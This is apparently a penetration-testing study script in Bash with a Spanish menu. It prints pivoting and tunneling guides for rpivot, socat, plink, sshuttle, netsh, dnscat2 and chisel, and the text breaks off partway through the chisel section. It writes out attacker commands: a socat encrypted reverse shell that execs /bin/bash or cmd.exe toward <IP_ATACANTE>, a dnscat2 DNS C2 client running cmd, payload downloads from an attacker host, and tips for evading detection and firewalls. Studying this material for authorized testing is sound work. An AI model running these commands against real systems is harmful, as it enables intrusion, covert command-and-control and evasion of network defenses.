#!/bin/bash

# Colores para el menú
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Función para mostrar el menú principal
show_menu() {
    clear
    echo -e "${BLUE}=== HelpMemory - Implementación de Metodologías ===${NC}"
    echo -e "${GREEN}1.${NC} Implementación con rpivot"
    echo -e "${GREEN}2.${NC} Implementación de Socat"
    echo -e "${GREEN}3.${NC} Implementación de Túneles con Plink"
    echo -e "${GREEN}4.${NC} Implementación de Túneles con SSHuttle"
    echo -e "${GREEN}5.${NC} Port Forwarding con Windows Netsh"
    echo -e "${GREEN}6.${NC} DNS Tunneling con Dnscat2"
    echo -e "${GREEN}7.${NC} Tunneling con Chisel"
    echo -e "${GREEN}8.${NC} ICMP Tunneling con ptunnel-ng"
    echo -e "${GREEN}9.${NC} Tunneling con SocksOverRDP"
    echo -e "${GREEN}10.${NC} Metodologías de Pivoting en Escenarios Reales"
    echo -e "${GREEN}11.${NC} Salir"
    echo
    echo -n "Seleccione una opción: "
}

# Función para implementar la metodología de pivoting
implement_pivoting() {
    echo -e "${BLUE}=== Implementación de Metodología de Pivoting ===${NC}"
    
    echo -e "${YELLOW}¿Qué es Pivoting?${NC}"
    echo "El pivoting es una técnica que permite acceder a redes internas a través de"
    echo "un host comprometido, actuando como un 'puente' o 'pivot' para acceder a"
    echo "sistemas que no son accesibles directamente desde el exterior."
    echo

    echo -e "${YELLOW}¿Qué es rpivot?${NC}"
    echo "rpivot es una herramienta especializada para realizar pivoting de manera"
    echo "eficiente y segura. Permite crear túneles SSH inversos a través de hosts"
    echo "comprometidos, facilitando el acceso a redes internas."
    echo

    # Verificar si rpivot está instalado
    if ! command -v rpivot &> /dev/null; then
        echo -e "${RED}Error: rpivot no está instalado.${NC}"
        echo
        echo -e "${YELLOW}Clonando repositorio...${NC}"
        echo -e "${GREEN}git clone https://github.com/klsecservices/rpivot.git${NC}"
        git clone https://github.com/klsecservices/rpivot.git
        echo
        cd rpivot
        echo
    fi

    echo -e "${GREEN}Configuración de Pivoting:${NC}"
    echo -e "${YELLOW}Nota:${NC} Necesitarás las siguientes información para configurar el pivoting:"
    echo "- IP del servidor pivot (host comprometido)"
    echo "- Puerto del servidor pivot (puerto que estará escuchando)"
    echo "- IP del cliente (tu máquina)"
    echo "- Puerto del cliente (puerto desde donde te conectarás)"
    echo

    read -p "Ingrese la IP del servidor pivot: " SERVER_IP
    read -p "Ingrese el puerto del servidor pivot: " SERVER_PORT
    read -p "Ingrese la IP del cliente: " CLIENT_IP
    read -p "Ingrese el puerto del cliente: " CLIENT_PORT

    echo -e "${GREEN}Iniciando servidor pivot...${NC}"
    echo -e "${YELLOW}Comando para el servidor (host comprometido):${NC}"
    echo "rpivot --server --ip $SERVER_IP --port $SERVER_PORT"
    echo
    echo -e "${YELLOW}Comando para el cliente (tu máquina):${NC}"
    echo "rpivot --client --ip $CLIENT_IP --port $CLIENT_PORT --server-ip $SERVER_IP --server-port $SERVER_PORT"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. El servidor pivot debe tener rpivot instalado"
    echo "2. Asegúrate de que los puertos especificados estén abiertos"
    echo "3. La conexión es bidireccional y encriptada"
    echo "4. Puedes usar este túnel para acceder a otros servicios en la red interna"
    echo

    echo -e "${YELLOW}Uso común:${NC}"
    echo "Una vez establecido el túnel, puedes usar herramientas como proxychains"
    echo "para enrutar el tráfico a través del pivot y acceder a la red interna."
}

# Función para implementar Socat
implement_socat() {
    echo -e "${BLUE}=== Guía de Implementación de Socat ===${NC}"
    
    echo -e "${YELLOW}¿Qué es Socat?${NC}"
    echo "Socat es una herramienta multipropósito para establecer conexiones bidireccionales"
    echo "entre dos puntos de datos. Es como una 'navaja suiza' para la red, permitiendo"
    echo "crear túneles, redirecciones y conexiones de red de manera flexible."
    echo

    echo -e "${GREEN}1. Preparación del Entorno${NC}"
    echo -e "${YELLOW}1.1 En la máquina atacante (Kali Linux):${NC}"
    echo "1. Instalar Socat:"
    echo "   sudo apt-get install socat"
    echo
    echo "2. Preparar binarios estáticos:"
    echo "   # Para Linux:"
    echo "   wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat"
    echo "   # Para Windows:"
    echo "   wget https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download"
    echo

    echo -e "${GREEN}2. Configuración de Túneles${NC}"
    echo -e "${YELLOW}2.1 Reverse Shell Relay${NC}"
    echo -e "${YELLOW}2.1.1 En la máquina atacante (Kali Linux):${NC}"
    echo "1. Iniciar listener:"
    echo "   sudo nc -lvnp 443"
    echo "   # El listener escuchará en 0.0.0.0:443"
    echo
    echo -e "${YELLOW}2.1.2 En el servidor comprometido (Linux/Windows):${NC}"
    echo "1. Ejecutar relay:"
    echo "   ./socat tcp-l:8000 tcp:<IP_ATACANTE>:443 &"
    echo "   # El relay escuchará en 0.0.0.0:8000"
    echo

    echo -e "${YELLOW}2.2 Port Forwarding -- Easy${NC}"
    echo -e "${YELLOW}2.2.1 En el servidor comprometido (Linux/Windows):${NC}"
    echo "1. Crear túnel simple:"
    echo "   ./socat tcp-l:33060,fork,reuseaddr tcp:<IP_DESTINO>:3306 &"
    echo "   # El túnel escuchará en 0.0.0.0:33060"
    echo "   # Redirigirá al puerto 3306 del host destino"
    echo

    echo -e "${YELLOW}2.3 Port Forwarding -- Quiet${NC}"
    echo -e "${YELLOW}2.3.1 En la máquina atacante (Kali Linux):${NC}"
    echo "1. Configurar relay local:"
    echo "   socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &"
    echo "   # Escucha en 0.0.0.0:8001 y 0.0.0.0:8000"
    echo
    echo -e "${YELLOW}2.3.2 En el servidor comprometido (Linux/Windows):{NC}"
    echo "1. Conectar al relay:"
    echo "   ./socat tcp:<IP_ATACANTE>:8001 tcp:<IP_DESTINO>:<PUERTO_DESTINO>,fork &"
    echo "   # Conecta al relay y redirige al destino"
    echo

    echo -e "${YELLOW}2.4 Shells Encriptadas${NC}"
    echo -e "${YELLOW}2.4.1 En la máquina atacante (Kali Linux):${NC}"
    echo "1. Generar certificado:"
    echo "   openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt"
    echo "2. Crear archivo PEM:"
    echo "   cat shell.key shell.crt > shell.pem"
    echo "3. Iniciar listener encriptado:"
    echo "   socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 -"
    echo "   # El listener escuchará en 0.0.0.0:443"
    echo
    echo -e "${YELLOW}2.4.2 En el servidor comprometido (Linux/Windows):${NC}"
    echo "1. Conectar con shell encriptada:"
    echo "   ./socat OPENSSL:<IP_ATACANTE>:443,verify=0 EXEC:/bin/bash"
    echo "   # Para Windows:"
    echo "   ./socat OPENSSL:<IP_ATACANTE>:443,verify=0 EXEC:cmd.exe"
    echo

    echo -e "${GREEN}3. Port Forwarding y Tunneling${NC}"
    echo -e "${YELLOW}3.1 Túnel TCP a TCP:${NC}"
    echo "1. En el servidor comprometido:"
    echo "   ./socat tcp-l:8080,fork,reuseaddr tcp:<IP_DESTINO>:80 &"
    echo "   # Redirige el puerto 8080 al puerto 80 del destino"
    echo
    echo -e "${YELLOW}3.2 Túnel UDP a TCP:${NC}"
    echo "1. En el servidor comprometido:"
    echo "   ./socat udp-l:53,fork,reuseaddr tcp:<IP_DESTINO>:53 &"
    echo "   # Redirige el puerto UDP 53 al puerto TCP 53 del destino"
    echo

    echo -e "${GREEN}4. Uso del Túnel${NC}"
    echo -e "${YELLOW}4.1 Acceso a Servicios:${NC}"
    echo "1. Para acceder a MySQL a través del túnel:"
    echo "   mysql -h 127.0.0.1 -P 33060 -u usuario -p"
    echo
    echo "2. Para acceder a un servicio web:"
    echo "   curl http://127.0.0.1:8080"
    echo
    echo "3. Para acceder a DNS:"
    echo "   dig @127.0.0.1 -p 53 example.com"
    echo

    echo -e "${GREEN}5. Verificación:${NC}"
    echo -e "${YELLOW}5.1 Verificar Túnel:${NC}"
    echo "1. Verificar proceso Socat:"
    echo "   ps aux | grep socat"
    echo "2. Verificar puertos:"
    echo "   netstat -tulpn | grep socat"
    echo "3. Probar conectividad:"
    echo "   telnet 127.0.0.1 <PUERTO>"
    echo

    echo -e "${GREEN}6. Best Practices:${NC}"
    echo -e "${YELLOW}6.1 Seguridad:${NC}"
    echo "1. Encriptación:"
    echo "   - Usar SSL/TLS para túneles"
    echo "   - Generar certificados fuertes"
    echo "   - Verificar certificados"
    echo
    echo "2. Implementación:"
    echo "   - Usar opciones fork y reuseaddr"
    echo "   - Configurar timeouts"
    echo "   - Mantener logs"
    echo
    echo "3. Mantenimiento:"
    echo "   - Monitorear conexiones"
    echo "   - Verificar estabilidad"
    echo "   - Actualizar versiones"
    echo

    echo -e "${GREEN}7. Troubleshooting:${NC}"
    echo -e "${YELLOW}7.1 Problemas de Conexión:${NC}"
    echo "1. Túnel no funciona:"
    echo "   - Verificar puertos"
    echo "   - Comprobar permisos"
    echo "   - Revisar firewall"
    echo
    echo "2. Shell encriptada falla:"
    echo "   - Verificar certificados"
    echo "   - Comprobar puerto 443"
    echo "   - Validar configuración"
    echo
    echo "3. Port forwarding no funciona:"
    echo "   - Verificar conectividad"
    echo "   - Comprobar puertos en uso"
    echo "   - Revisar logs"
    echo

    echo -e "${GREEN}8. References:${NC}"
    echo -e "${YELLOW}8.1 Documentación:${NC}"
    echo "1. Oficial:"
    echo "   - Socat Homepage: http://www.dest-unreach.org/socat/"
    echo "   - Manual: http://www.dest-unreach.org/socat/doc/socat.html"
    echo
    echo "2. Herramientas Relacionadas:"
    echo "   - Netcat"
    echo "   - OpenSSL"
    echo "   - Stunnel"
    echo
    echo "3. Recursos Adicionales:"
    echo "   - Ejemplos de uso"
    echo "   - Casos de estudio"
    echo "   - Foros de soporte"
}

# Función para implementar túneles con Plink
implement_plink() {
    echo -e "${BLUE}=== Implementación de Túneles con Plink ===${NC}"
    
    echo -e "${YELLOW}¿Qué es Plink?${NC}"
    echo "Plink (PuTTY Link) es una versión de línea de comandos de PuTTY que permite"
    echo "crear túneles SSH de manera eficiente. Es especialmente útil en sistemas"
    echo "Windows para establecer conexiones seguras y túneles."
    echo

    echo -e "${YELLOW}Requisitos:${NC}"
    echo "1. Plink.exe debe estar en el PATH o en el directorio actual"
    echo "2. Archivo de clave privada (.ppk) o contraseña para la conexión SSH"
    echo "3. Acceso SSH al servidor objetivo"
    echo

    # Verificar si plink está disponible
    if ! command -v plink &> /dev/null; then
        echo -e "${RED}Error: plink no está instalado o no está en el PATH.${NC}"
        echo -e "${YELLOW}Para instalar Plink:${NC}"
        echo "1. Descarga PuTTY desde: https://www.putty.org/"
        echo "2. Extrae plink.exe a una ubicación en tu PATH"
        echo "   o colócalo en el directorio actual"
        echo
        echo -e "${YELLOW}Nota:${NC} En Windows, puedes usar el comando:"
        echo "copy C:\Program Files\PuTTY\plink.exe ."
        return 1
    fi

    echo -e "${GREEN}Configuración del Túnel:${NC}"
    echo -e "${YELLOW}Necesitarás:${NC}"
    echo "- IP o hostname del servidor SSH"
    echo "- Puerto SSH (por defecto 22)"
    echo "- Usuario SSH"
    echo "- Puerto local para el túnel"
    echo "- Puerto remoto para el túnel"
    echo

    read -p "Ingrese la IP o hostname del servidor SSH: " SSH_SERVER
    read -p "Ingrese el puerto SSH (default 22): " SSH_PORT
    SSH_PORT=${SSH_PORT:-22}
    read -p "Ingrese el usuario SSH: " SSH_USER
    read -p "Ingrese el puerto local para el túnel: " LOCAL_PORT
    read -p "Ingrese el puerto remoto para el túnel: " REMOTE_PORT

    echo -e "${GREEN}Comandos para crear el túnel:${NC}"
    echo
    echo -e "${YELLOW}1. Usando contraseña:${NC}"
    echo "plink -P $SSH_PORT -L $LOCAL_PORT:localhost:$REMOTE_PORT $SSH_USER@$SSH_SERVER"
    echo
    echo -e "${YELLOW}2. Usando archivo de clave (.ppk):${NC}"
    echo "plink -P $SSH_PORT -i ruta/a/tu/clave.ppk -L $LOCAL_PORT:localhost:$REMOTE_PORT $SSH_USER@$SSH_SERVER"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. El formato -L es: puerto_local:host_remoto:puerto_remoto"
    echo "2. Para túneles inversos, usa -R en lugar de -L"
    echo "3. Agrega -N para no ejecutar comandos remotos (solo túnel)"
    echo "4. Agrega -C para comprimir el tráfico"
    echo

    echo -e "${YELLOW}Ejemplos de uso común:${NC}"
    echo "1. Túnel para acceder a un servicio web interno:"
    echo "plink -L 8080:localhost:80 usuario@servidor"
    echo
    echo "2. Túnel inverso para acceso remoto:"
    echo "plink -R 2222:localhost:22 usuario@servidor"
    echo
    echo "3. Túnel con compresión y sin shell:"
    echo "plink -N -C -L 3306:localhost:3306 usuario@servidor"
}

# Función para implementar túneles con SSHuttle
implement_sshuttle() {
    echo -e "${BLUE}=== Implementación de Túneles con SSHuttle ===${NC}"
    
    echo -e "${YELLOW}¿Qué es SSHuttle?${NC}"
    echo "SSHuttle es una herramienta que permite crear un túnel SSH que simula una VPN,"
    echo "permitiendo enrutar tu tráfico hacia la red de destino sin necesidad de configurar"
    echo "un proxy manualmente. Todo el tráfico entre tu máquina y el servidor comprometido"
    echo "estará encriptado, mejorando la seguridad."
    echo

    echo -e "${YELLOW}Requisitos:${NC}"
    echo "1. Python 2.6+ o Python 3.2+"
    echo "2. Acceso SSH al servidor objetivo"
    echo "3. Permisos de root/sudo (para modificar rutas de red)"
    echo

    # Verificar si sshuttle está instalado
    if ! command -v sshuttle &> /dev/null; then
        echo -e "${RED}Error: sshuttle no está instalado.${NC}"
        echo -e "${YELLOW}Para instalar SSHuttle:${NC}"
        echo "En Debian/Ubuntu:"
        echo "sudo apt-get install sshuttle"
        echo
        echo "En CentOS/RHEL:"
        echo "sudo yum install sshuttle"
        echo
        echo "En Arch Linux:"
        echo "sudo pacman -S sshuttle"
        echo
        echo "Con pip:"
        echo "pip install sshuttle"
        return 1
    fi

    echo -e "${GREEN}Configuración del Túnel:${NC}"
    echo -e "${YELLOW}Necesitarás:${NC}"
    echo "- IP o hostname del servidor SSH"
    echo "- Puerto SSH (por defecto 22)"
    echo "- Usuario SSH"
    echo "- Redes a enrutar (por ejemplo: 192.168.1.0/24)"
    echo

    read -p "Ingrese la IP o hostname del servidor SSH: " SSH_SERVER
    read -p "Ingrese el puerto SSH (default 22): " SSH_PORT
    SSH_PORT=${SSH_PORT:-22}
    read -p "Ingrese el usuario SSH: " SSH_USER
    read -p "Ingrese la red a enrutar (ej: 192.168.1.0/24): " NETWORK

    echo -e "${GREEN}Comandos para crear el túnel:${NC}"
    echo
    echo -e "${YELLOW}1. Túnel básico:${NC}"
    echo "sshuttle -r $SSH_USER@$SSH_SERVER:$SSH_PORT $NETWORK"
    echo
    echo -e "${YELLOW}2. Detección automática de subredes:${NC}"
    echo "sshuttle -r $SSH_USER@$SSH_SERVER:$SSH_PORT -N"
    echo -e "${YELLOW}Nota:${NC} Esta opción no siempre funciona con todos los servidores, ya que"
    echo "depende de la configuración del servidor comprometido."
    echo
    echo -e "${YELLOW}3. Autenticación con clave SSH:${NC}"
    echo "sshuttle -r $SSH_USER@$SSH_SERVER:$SSH_PORT --ssh-cmd \"ssh -i ruta/a/clave\" $NETWORK"
    echo
    echo -e "${YELLOW}4. Excluir IP específica:${NC}"
    echo "sshuttle -r $SSH_USER@$SSH_SERVER:$SSH_PORT $NETWORK -x $SSH_SERVER"
    echo -e "${YELLOW}Nota:${NC} Útil cuando el servidor comprometido está dentro del rango de"
    echo "subred a la que intentas acceder, para evitar interrupciones de la conexión."
    echo
    echo -e "${YELLOW}5. Ejecutar en segundo plano:${NC}"
    echo "sshuttle -r $SSH_USER@$SSH_SERVER:$SSH_PORT $NETWORK &"
    echo

    echo -e "${YELLOW}Opciones importantes:${NC}"
    echo "-r: Especifica el servidor remoto al que te conectarás"
    echo "-N: Detecta automáticamente las subredes usando la tabla de enrutamiento"
    echo "--ssh-cmd: Permite especificar el comando SSH completo (útil para claves SSH)"
    echo "-x: Excluye una IP del túnel para evitar interrupciones de la conexión"
    echo "-v: Modo verbose para depuración"
    echo "--no-latency-control: Desactiva el control de latencia"
    echo

    echo -e "${YELLOW}Ejemplos de uso común:${NC}"
    echo "1. Túnel básico con subred específica:"
    echo "sshuttle -r user@172.16.0.5 172.16.0.0/24"
    echo
    echo "2. Detección automática de subredes:"
    echo "sshuttle -r user@172.16.0.5 -N"
    echo
    echo "3. Autenticación con clave SSH:"
    echo "sshuttle -r root@10.201.134.200 --ssh-cmd \"ssh -i id\" 10.201.134.0/24"
    echo
    echo "4. Excluir IP del servidor comprometido:"
    echo "sshuttle -r root@10.201.134.200 10.201.134.0/24 -x 10.201.134.200"
    echo
    echo "5. Ejecutar en segundo plano:"
    echo "sshuttle -r user@172.16.0.5 172.16.0.0/24 &"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. SSHuttle requiere permisos de root/sudo"
    echo "2. Puede enrutar todo el tráfico o redes específicas"
    echo "3. Soporta enrutamiento de DNS y UDP"
    echo "4. Es más eficiente que los túneles SSH tradicionales"
    echo "5. No requiere configuración en el servidor remoto"
    echo "6. Usar -x para evitar bucles de conexión cuando el servidor está en la subred"
    echo "7. Agregar & al final para ejecutar en segundo plano"
    echo "8. La detección automática de subredes (-N) puede no funcionar en todos los servidores"
}

# Función para implementar Port Forwarding con Netsh
implement_netsh() {
    echo -e "${BLUE}=== Port Forwarding con Windows Netsh ===${NC}"
    
    echo -e "${YELLOW}¿Qué es Netsh?${NC}"
    echo "Netsh (Network Shell) es una herramienta de línea de comandos de Windows"
    echo "que permite configurar y monitorear dispositivos de red en Windows."
    echo "Es especialmente útil para configurar reenvío de puertos y túneles"
    echo "en sistemas Windows comprometidos."
    echo

    echo -e "${GREEN}Requisitos:${NC}"
    echo "1. Windows 7 o superior"
    echo "2. Ejecutar como administrador"
    echo "3. CMD o PowerShell"
    echo

    echo -e "${GREEN}Comandos Básicos:${NC}"
    echo "1. Ver reglas actuales:"
    echo "netsh interface portproxy show all"
    echo
    echo "2. Eliminar todas las reglas:"
    echo "netsh interface portproxy reset"
    echo

    echo -e "${GREEN}Tipos de Port Forwarding:${NC}"
    echo "1. IPv4 a IPv4:"
    echo "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=3389 connectaddress=172.16.5.25"
    echo
    echo "2. IPv4 a IPv6:"
    echo "netsh interface portproxy add v4tov6 listenport=8080 listenaddress=0.0.0.0 connectport=3389 connectaddress=2001:db8::1"
    echo
    echo "3. IPv6 a IPv4:"
    echo "netsh interface portproxy add v6tov4 listenport=8080 listenaddress=:: connectport=3389 connectaddress=172.16.5.25"
    echo
    echo "4. IPv6 a IPv6:"
    echo "netsh interface portproxy add v6tov6 listenport=8080 listenaddress=:: connectport=3389 connectaddress=2001:db8::1"
    echo

    echo -e "${GREEN}Ejemplos Prácticos:${NC}"
    echo "1. Acceso RDP a través de un host comprometido:"
    echo "Host comprometido: 10.129.15.150"
    echo "Objetivo RDP: 172.16.5.25:3389"
    echo "Comando: netsh interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25"
    echo "Acceso: mstsc /v:10.129.15.150:8080"
    echo
    echo "2. Acceso Web a través de un host comprometido:"
    echo "Host comprometido: 10.129.15.150"
    echo "Objetivo Web: 172.16.5.25:80"
    echo "Comando: netsh interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=80 connectaddress=172.16.5.25"
    echo "Acceso: http://10.129.15.150:8080"
    echo
    echo "3. Acceso SSH a través de un host comprometido:"
    echo "Host comprometido: 10.129.15.150"
    echo "Objetivo SSH: 172.16.5.25:22"
    echo "Comando: netsh interface portproxy add v4tov4 listenport=2222 listenaddress=10.129.15.150 connectport=22 connectaddress=172.16.5.25"
    echo "Acceso: ssh -p 2222 usuario@10.129.15.150"
    echo

    echo -e "${GREEN}Eliminar Reglas:${NC}"
    echo "1. Eliminar regla específica:"
    echo "netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=10.129.15.150"
    echo
    echo "2. Eliminar todas las reglas:"
    echo "netsh interface portproxy reset"
    echo

    echo -e "${GREEN}Verificación:${NC}"
    echo "1. Verificar reglas activas:"
    echo "netsh interface portproxy show all"
    echo
    echo "2. Verificar conectividad:"
    echo "Test-NetConnection -ComputerName 10.129.15.150 -Port 8080"
    echo
    echo "3. Verificar servicio:"
    echo "netstat -an | findstr 8080"
    echo

    echo -e "${GREEN}Best Practices:${NC}"
    echo "1. Seguridad:"
    echo "   - Usar puertos no estándar para evitar detección"
    echo "   - Limitar el acceso a IPs específicas"
    echo "   - Documentar todas las reglas creadas"
    echo
    echo "2. Implementación:"
    echo "   - Verificar disponibilidad de puertos antes de usar"
    echo "   - Usar nombres descriptivos para las reglas"
    echo "   - Mantener un registro de cambios"
    echo
    echo "3. Mantenimiento:"
    echo "   - Revisar regularmente las reglas activas"
    echo "   - Eliminar reglas no utilizadas"
    echo "   - Documentar cambios en la configuración"
    echo

    echo -e "${GREEN}Troubleshooting:${NC}"
    echo "1. Problemas de Conectividad:"
    echo "   - Verificar que el servicio está activo"
    echo "   - Comprobar reglas de firewall"
    echo "   - Verificar que los puertos están abiertos"
    echo
    echo "2. Problemas de Permisos:"
    echo "   - Ejecutar como administrador"
    echo "   - Verificar políticas de grupo"
    echo "   - Comprobar permisos de usuario"
    echo
    echo "3. Problemas de Configuración:"
    echo "   - Verificar sintaxis de comandos"
    echo "   - Comprobar IPs y puertos"
    echo "   - Validar reglas existentes"
    echo

    echo -e "${GREEN}References:${NC}"
    echo "1. Documentación Oficial:"
    echo "   - Microsoft Docs: https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh"
    echo "   - Windows Server: https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-interface-portproxy"
    echo
    echo "2. Herramientas Relacionadas:"
    echo "   - PortQry: Herramienta de diagnóstico de puertos"
    echo "   - TCPView: Visualización de conexiones TCP/UDP"
    echo "   - Netstat: Comando nativo para ver conexiones"
    echo
    echo "3. Recursos Adicionales:"
    echo "   - Windows Networking Blog"
    echo "   - Microsoft TechNet"
    echo "   - Windows Server Forums"
}

# Función para implementar DNS Tunneling con Dnscat2
implement_dnscat2() {
    echo -e "${BLUE}=== DNS Tunneling con Dnscat2 ===${NC}"
    
    echo -e "${YELLOW}¿Qué es Dnscat2?${NC}"
    echo "Dnscat2 es una herramienta de tunelización que utiliza el protocolo DNS para"
    echo "enviar datos entre dos hosts. Utiliza un canal cifrado de Comando y Control (C&C)"
    echo "y envía datos dentro de registros TXT dentro del protocolo DNS."
    echo

    echo -e "${YELLOW}Requisitos:${NC}"
    echo "1. Ruby y Bundler instalados"
    echo "2. Acceso a un servidor DNS"
    echo "3. Permisos de administrador para ejecutar el servidor"
    echo

    # Verificar si dnscat2 está instalado
    if [ ! -d "dnscat2" ]; then
        echo -e "${YELLOW}Clonando repositorio de Dnscat2...${NC}"
        git clone https://github.com/iagox86/dnscat2.git
        echo
        echo -e "${YELLOW}Instalando dependencias...${NC}"
        cd dnscat2/server/
        sudo gem install bundler
        sudo bundle install
        cd ../..
        echo
    fi

    echo -e "${GREEN}Configuración del Servidor Dnscat2:${NC}"
    echo -e "${YELLOW}Necesitarás:${NC}"
    echo "- IP del servidor DNS"
    echo "- Puerto DNS (por defecto 53)"
    echo "- Dominio para el túnel"
    echo

    read -p "Ingrese la IP del servidor DNS: " DNS_IP
    read -p "Ingrese el puerto DNS (default 53): " DNS_PORT
    DNS_PORT=${DNS_PORT:-53}
    read -p "Ingrese el dominio para el túnel: " DNS_DOMAIN

    echo -e "${GREEN}Comandos para iniciar el servidor:${NC}"
    echo
    echo -e "${YELLOW}1. Iniciar servidor Dnscat2:${NC}"
    echo "sudo ruby dnscat2/server/dnscat2.rb --dns host=$DNS_IP,port=$DNS_PORT,domain=$DNS_DOMAIN --no-cache"
    echo

    echo -e "${GREEN}Configuración del Cliente Dnscat2 (Windows):${NC}"
    echo -e "${YELLOW}1. Clonar dnscat2-powershell:${NC}"
    echo "git clone https://github.com/lukebaggett/dnscat2-powershell.git"
    echo
    echo -e "${YELLOW}2. Importar el módulo en PowerShell:${NC}"
    echo "Import-Module .\dnscat2.ps1"
    echo
    echo -e "${YELLOW}3. Iniciar el cliente Dnscat2:${NC}"
    echo "Start-Dnscat2 -DNSserver $DNS_IP -Domain $DNS_DOMAIN -PreSharedSecret [SECRET_KEY] -Exec cmd"
    echo -e "${YELLOW}Nota:${NC} Reemplaza [SECRET_KEY] con la clave generada por el servidor"
    echo

    echo -e "${YELLOW}Comandos útiles en la consola Dnscat2:${NC}"
    echo "1. Listar sesiones activas:"
    echo "windows"
    echo
    echo "2. Interactuar con una sesión:"
    echo "window -i [ID_SESION]"
    echo
    echo "3. Crear un túnel:"
    echo "tunnels"
    echo
    echo "4. Matar una sesión:"
    echo "kill [ID_SESION]"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. El servidor debe ejecutarse con permisos de administrador"
    echo "2. El puerto 53 debe estar disponible y accesible"
    echo "3. La clave precompartida es crucial para la seguridad"
    echo "4. El túnel DNS puede ser detectado por sistemas IDS/IPS"
    echo "5. Útil para evadir firewalls que bloquean conexiones directas"
    echo "6. El tráfico DNS debe poder salir de la red objetivo"
}

# Función para implementar Tunneling con Chisel
implement_chisel() {
    echo -e "${BLUE}=== Tunneling con Chisel ===${NC}"
    
    echo -e "${YELLOW}¿Qué es Chisel?${NC}"
    echo "Chisel es una herramienta de túnel basada en TCP/UDP escrita en Go que utiliza"
    echo "HTTP para transportar datos protegidos mediante SSH. Permite crear conexiones"
    echo "de túnel cliente-servidor en entornos restringidos por cortafuegos."
    echo

    echo -e "${GREEN}1. Preparación del Entorno${NC}"
    echo -e "${YELLOW}1.1 En la máquina atacante (Kali Linux):${NC}"
    echo "1. Clonar y compilar Chisel:"
    echo "   git clone https://github.com/jpillora/chisel.git"
    echo "   cd chisel"
    echo "   go build"
    echo "   cd .."
    echo
    echo "2. Preparar directorio compartido:"
    echo "   mkdir -p /tmp/chisel"
    echo "   cp chisel/chisel /tmp/chisel/"
    echo

    echo -e "${GREEN}2. Configuración del Túnel${NC}"
    echo -e "${YELLOW}2.1 Modo Normal (Servidor en Máquina Atacante)${NC}"
    echo -e "${YELLOW}2.1.1 En la máquina atacante (Kali Linux):${NC}"
    echo "1. Iniciar servidor Chisel:"
    echo "   ./chisel server -v -p 9443 --socks5"
    echo "   # El servidor escuchará en 0.0.0.0:9443"
    echo
    echo "2. Preparar binario para transferencia:"
    echo "   cp chisel /tmp/chisel/"
    echo "   # Iniciar servidor web para transferencia:"
    echo "   python3 -m http.server 8000"
    echo
    echo -e "${YELLOW}2.1.2 En el host pivote (Linux/Windows):${NC}"
    echo "1. Descargar binario de Chisel:"
    echo "   # Usando wget:"
    echo "   wget http://<IP_ATACANTE>:8000/chisel"
    echo "   # O usando curl:"
    echo "   curl -o chisel http://<IP_ATACANTE>:8000/chisel"
    echo
    echo "2. Dar permisos de ejecución:"
    echo "   chmod +x chisel"
    echo
    echo "3. Conectar cliente Chisel:"
    echo "   ./chisel client -v <IP_ATACANTE>:9443 socks"
    echo "   # El cliente creará un túnel SOCKS en 127.0.0.1:1080"
    echo

    echo -e "${GREEN}3. Configuración de Proxychains${NC}"
    echo -e "${YELLOW}3.1 En la máquina atacante (Kali Linux):${NC}"
    echo "1. Editar /etc/proxychains.conf:"
    echo "   # Agregar o modificar la línea:"
    echo "   socks5 127.0.0.1 1080"
    echo

    echo -e "${GREEN}4. Port Forwarding y Tunneling${NC}"
    echo -e "${YELLOW}4.1 Túnel SOCKS5:${NC}"
    echo "1. El túnel SOCKS5 se crea automáticamente en 127.0.0.1:1080"
    echo "2. Todo el tráfico a través de proxychains se enruta por el túnel"
    echo
    echo -e "${YELLOW}4.2 Verificación del Túnel:${NC}"
    echo "1. En la máquina atacante:"
    echo "   netstat -tulpn | grep 1080"
    echo "2. En el host pivote:"
    echo "   netstat -tulpn | grep 9443"
    echo

    echo -e "${GREEN}5. Uso del Túnel${NC}"
    echo -e "${YELLOW}5.1 Acceso a Redes Internas:${NC}"
    echo "1. Usar proxychains para enrutar herramientas:"
    echo "   proxychains nmap -sT -p- <IP_INTERNA>"
    echo "   proxychains xfreerdp /v:<IP_INTERNA> /u:<USUARIO> /p:<CONTRASEÑA>"
    echo

    echo -e "${GREEN}6. Verificación:${NC}"
    echo -e "${YELLOW}6.1 Verificar Túnel:${NC}"
    echo "1. Verificar proceso Chisel:"
    echo "   ps aux | grep chisel"
    echo "2. Verificar puertos:"
    echo "   netstat -tulpn | grep -E '1080|9443'"
    echo "3. Probar conectividad:"
    echo "   proxychains curl -v http://<IP_INTERNA>"
    echo

    echo -e "${GREEN}7. Best Practices:${NC}"
    echo -e "${YELLOW}7.1 Seguridad:${NC}"
    echo "1. Autenticación:"
    echo "   - Usar autenticación con clave"
    echo "   - Configurar contraseñas fuertes"
    echo "   - Limitar acceso por IP"
    echo
    echo "2. Implementación:"
    echo "   - Usar puertos no estándar"
    echo "   - Encriptar tráfico"
    echo "   - Mantener logs de actividad"
    echo
    echo "3. Mantenimiento:"
    echo "   - Monitorear uso de recursos"
    echo "   - Verificar estabilidad"
    echo "   - Actualizar versiones"
    echo

    echo -e "${GREEN}8. Troubleshooting:${NC}"
    echo -e "${YELLOW}8.1 Problemas de Conexión:${NC}"
    echo "1. Servidor no inicia:"
    echo "   - Verificar permisos"
    echo "   - Comprobar puerto disponible"
    echo "   - Revisar logs"
    echo
    echo "2. Cliente no conecta:"
    echo "   - Verificar firewall"
